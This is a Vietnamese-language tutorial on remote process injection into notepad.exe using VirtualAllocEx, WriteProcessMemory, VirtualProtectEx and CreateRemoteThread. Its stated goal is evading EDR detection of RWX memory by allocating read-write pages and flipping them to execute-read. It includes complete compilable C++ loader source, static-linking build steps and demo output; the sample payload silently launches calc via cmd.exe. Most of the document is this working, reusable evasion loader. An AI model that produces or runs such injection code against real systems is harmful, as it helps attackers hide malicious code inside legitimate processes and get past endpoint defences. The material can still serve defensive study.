
---

# 📝 [PE 04] Classic Code Injection — VirtualProtect

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Classic Code Injection kết hợp sửa đổi thuộc tính trang nhớ (Memory Protection Alteration)** đại diện cho mô hình cải tiến thuộc phân hệ **Né tránh phòng thủ động (Dynamic Evasion / Memory Anti-Forensics)**.

Hầu hết các giải pháp Endpoint Detection and Response (EDR) hiện đại đều thiết lập các bộ lọc hành vi (Behavioral Filters) và bẫy giám sát (User-mode API Hooks) nghiêm ngặt tại các hàm API cấp phát bộ nhớ ảo. Nếu một tiến trình phát ra yêu cầu khởi tạo một phân vùng ảo mang sẵn thuộc tính cấu hình **`PAGE_EXECUTE_READWRITE` (RWX)** chéo tiến trình, EDR Engine sẽ ngay lập tức phân loại đây là chỉ dấu nguy hiểm (Anomalous Memory Allocation), kích hoạt cơ chế ngăn chặn.

Giải thuật của dự án PE 04 hóa giải rào cản trên bằng chiến thuật **Phân rã chu kỳ sống của trang bộ nhớ (Memory Lifecycle Decoupling)**. Ban đầu, Loader chỉ yêu cầu cấp phát một trang nhớ mang quyền Đọc/Ghi (**`PAGE_READWRITE` - RW**) hợp pháp để nạp dữ liệu, sau đó mới tận dụng hàm Native Subsystem **`VirtualProtectEx`** để lật cờ bảo vệ sang thuộc tính Thực thi (**`PAGE_EXECUTE_READ` - RX**) ngay trước khi phân phối dòng chảy CPU.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa bộ lọc Heuristic RAM**: Né tránh cơ chế quét đặc quyền trang nhớ mập mờ (RWX Hunting) của các giải pháp an ninh tại thời điểm phân bổ.
* **Làm chủ cơ chế Memory Protection Constants**: Nghiên cứu cấu trúc quản lý thuộc tính bảo vệ trang bộ nhớ ảo của Windows Subsystem tại thời điểm runtime.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Hệ điều hành Windows quản lý quyền hạn thực thi, đọc, ghi của từng trang bộ nhớ ảo thông qua cấu trúc Bảng trang (Page Tables) được thiết lập trong bộ nhớ RAM và được xử lý trực tiếp bởi phần cứng MMU của CPU. Giải thuật phân rã chu kỳ sống trang nhớ được điều phối ngầm qua 4 bước cấu trúc kịch khung:

```
[VirtualAllocEx: Phân bổ trang nhớ ngụy trang quyền RW]
       └──> [WriteProcessMemory: Ánh xạ logic mã máy tĩnh]
                 └──> [VirtualProtectEx: Lật cờ Bảng trang sang thuộc tính RX]
                           └──> [CreateRemoteThread: Khai hỏa Thread Context]

```

1. **Ngụy trang phân vùng dữ liệu ảo (`VirtualAllocEx`)**: Loader gửi yêu cầu xuống Kernel xin cấp phát một vùng nhớ chéo tiến trình mang cờ thuộc tính `PAGE_READWRITE`. Đối với hệ thống giám sát hành vi của EDR, đây là hành vi khởi tạo phân vùng chứa dữ liệu thông thường (như nạp bộ đệm văn bản, khởi tạo mảng) của các ứng dụng chuẩn chỉ, do đó cấu trúc này hoàn toàn vượt qua vòng thẩm duyệt hành vi sơ khởi.
2. **Nạp dữ liệu cấu trúc tĩnh (`WriteProcessMemory`)**: Loader tiến hành sao chép mảng byte dữ liệu tuyệt đối toán học và khối mã máy phẳng vào phân vùng mang quyền `RW` vừa tạo. Tại thời điểm này, khối mã máy ký sinh hoàn toàn bất động và không có khả năng kích nổ luồng. Nếu con trỏ lệnh CPU vô tình nhảy vào tọa độ này, cơ chế bảo vệ phần cứng **Data Execution Prevention (DEP)** của bộ vi xử lý sẽ ngay lập tức chặn đứng và sụp đổ tiến trình (`Access Violation - 0xC0000005`).
3. **Mở khóa cờ thực thi động (`VirtualProtectEx`)**: Ngay trước khi phân phối dòng chảy CPU, Loader phát lệnh yêu cầu Windows Kernel can thiệp vào cấu trúc bảng quản lý bộ nhớ của tiến trình đích, lật cờ bảo vệ của phân vùng từ `PAGE_READWRITE` sang **`PAGE_EXECUTE_READ` (RX)**. Lúc này, trang nhớ chính thức biến đổi thành một phân đoạn mã máy hợp pháp, triệt tiêu hoàn toàn dấu vết của cấu trúc `RWX` mập mờ.
4. **Triệu hồi Thread Context từ xa (`CreateRemoteThread`)**: Kernel Windows khởi tạo một luồng thực thi phụ inside tiến trình đích, bốc tọa độ phân vùng `RX` nạp vào thanh ghi chỉ mục lệnh **`Rip`** để CPU bắt đầu chu kỳ rút lệnh xử lý Payload.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn tuân thủ nghiêm ngặt nguyên lý thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** và bóc tách cấu trúc dữ liệu tuyệt đối nhằm triệt tiêu lỗi dịch chuyển địa chỉ tương đối (RIP-Relative Error).

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí nạp RAM
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _PROTECT_THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Phân vùng chứa chuỗi lệnh thực thi chức năng nằm khít cấu trúc
} PROTECT_THREAD_DATA, *PPROTECT_THREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy chéo tiến trình
DWORD WINAPI RemoteProtectPayload(LPVOID lpParam) {
    PPROTECT_THREAD_DATA pData = (PPROTECT_THREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) { 
                    pid = pe32.th32ProcessID; 
                    break; 
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 04: REMOTE INJECTION - VIRTUALPROTECT RX" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcessName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetProcessName);
    if (dwPID == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed! Quyen han CLI bi gioi han." << std::endl;
        return EXIT_FAILURE;
    }

    SIZE_T functionSize = 500;

    // BƯỚC 1: Né tránh bộ lọc Heuristic - Chỉ cấp phát vùng nhớ mang quyền ĐỌC/GHI (PAGE_READWRITE)
    std::cout << "[*] Dang ngu trang cap phat phan vung mang quyen RW..." << std::endl;
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID remoteDataBuffer = VirtualAllocEx(hProcess, NULL, sizeof(PROTECT_THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] VirtualAllocEx failed!" << std::endl;
        if (remoteCodeBuffer) VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Trang nho Code khoi tao voi quyen RW tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ phục vụ ánh xạ chéo RAM
    PROTECT_THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // BƯỚC 2: Ghi dữ liệu Payload lên phân vùng thuộc tính RW thông thường
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteProtectPayload, functionSize, NULL);
    WriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(PROTECT_THREAD_DATA), NULL);
    std::cout << "[+] Na nap ma may va tham so sang phan vung RW hoan tat." << std::endl;

    // BƯỚC 3: CHIẾN THUẬT LẬT CỜ BẢNG TRANG - Chuyển đổi thuộc tính vùng nhớ sang PAGE_EXECUTE_READ (RX)
    std::cout << "[*] Dang kich hoat VirtualProtectEx de mo khoa quyen thuc thi RX..." << std::endl;
    DWORD oldProtect = 0;
    BOOL isProtected = VirtualProtectEx(hProcess, remoteCodeBuffer, functionSize, PAGE_EXECUTE_READ, &oldProtect);
    
    if (!isProtected) {
        std::cerr << "[-] VirtualProtectEx that bai! Luong bao ve cua OS ngan chan." << std::endl;
        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteDataBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Mo khoa trang nho sang quyen RX thanh cong! (Co bao ve cu: 0x" << std::hex << oldProtect << ")" << std::endl;

    // BƯỚC 4: Kích nổ luồng thực thi an toàn thông qua phân vùng RX phẳng sạch
    std::cout << "[*] Dang thuc hien khoi tao luong tu xa..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
    
    if (hThread) {
        // Đồng bộ hóa luồng nhằm gánh dứt điểm luồng thực thi chéo tiến trình phẳng sạch
        WaitForSingleObject(hThread, INFINITE); 
        std::cout << "[+] VirtualProtect Code Injection Successful!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] CreateRemoteThread failed! Error Code: " << GetLastError() << std::endl;
    }

    // Thu hồi tài nguyên Handle hệ thống triệt để chống Memory Leak
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hợp Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file nhị phân vận hành độc lập tuyến tính, loại bỏ các lỗi thiếu thư viện runtime khi phân phối sang các môi trường máy ảo VM sạch hoặc Sandbox kiểm thử chuyên sâu:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thuộc tính `Runtime Library`, cấu hình cờ **`Multi-threaded (/MT)`** để nhúng tĩnh (Static Linkage) toàn bộ thư viện hệ thống lọt lòng file thực thi `.exe`.

> **Vị trí đặt ảnh minh chứng cấu hình biên dịch hệ thống:**
> 

3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng lỗi phân rã chuỗi.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng vỏ bọc `Notepad.exe` trên môi trường máy Lab, sau đó kích hỏa tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm theo dõi ma trận lật cờ bảo vệ trang nhớ:

```powershell
PS C:\Workspace\x64\Release> .\PE04_VirtualProtect_Injection.exe
====================================================
[*] PE 04: REMOTE INJECTION - VIRTUALPROTECT RX
====================================================
[+] Da tim thay Notepad.exe voi PID: 18240
[*] Dang ngu trang cap phat phan vung mang quyen RW...
[+] Trang nho Code khoi tao voi quyen RW tai: 0x0000021F83A20000
[+] Na nap ma may va tham so sang phan vung RW hoan tat.
[*] Dang kich hoat VirtualProtectEx de mo khoa quyen thuc thi RX...
[+] Mo khoa trang nho sang quyen RX thanh cong! (Co bao ve cu: 0x4)
[*] Dang thuc hien khoi tao luong tu xa...
[+] VirtualProtect Code Injection Successful!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm lật cờ trang nhớ ảo:**
> 

### 🎯 Phân tích hệ quả cấu trúc RAM:

* Chỉ số cờ bảo vệ cũ hiển thị giá trị **`0x4`** (tương ứng với hằng số thuộc tính `PAGE_READWRITE` của cấu trúc Windows API), minh chứng vùng nhớ ban đầu được khởi tạo ở trạng thái phẳng sạch, ngụy trang hoàn hảo.
* Lệnh lật cờ thực thi hoàn tất, trả về trạng thái mở khóa `RX` thành công. Ứng dụng Máy tính `calc.exe` bật bung hiên ngang tại runtime dưới danh nghĩa luồng phụ của Notepad, bẻ gãy hoàn toàn cơ chế trinh sát cờ `RWX` mập mờ kịch trần kịch khung!

---